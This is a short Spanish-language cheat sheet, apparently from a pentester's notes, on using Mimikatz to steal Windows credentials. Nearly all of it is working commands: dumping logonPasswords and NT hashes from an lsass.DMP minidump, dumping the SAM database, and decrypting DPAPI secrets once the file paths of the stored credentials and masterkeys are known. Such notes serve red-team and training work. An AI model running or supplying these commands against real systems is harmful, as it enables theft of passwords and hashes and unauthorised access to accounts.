## lsass.DMP

En caso de que tengamos un archivo `lsass.dmp` podemos dumpear los `logonPasswords` y ver los hashes NT:

```shell
sekurlsa::minidump lsass.DMP
sekurlsa::logonPasswords
```

## Dumpear SAM

```
lsadump::sam
```

## DPAPI secrets

Para esto necesitamos la credencial y la masterkey, se encuentran en `C:\Users\<USUARIO>\AppData\Roaming\Microsoft\Credentials` y en `C:\Users\<USUARIO>\AppData\Roaming\Microsoft\Protect`, respectivamente. Con mimikatz podemos dumpearlas

```
dpapi::masterkey /in:maskterkey /sid:SID /password:contraseña
```

Al hacer esto mimikatz guarda la masterkey y la credencial dpapi en cache

```
dpapi::cache
```

Luego le pasamos la credencial y vemos los secretos de dpapi

```
dpapi::cred /in:credencial
```

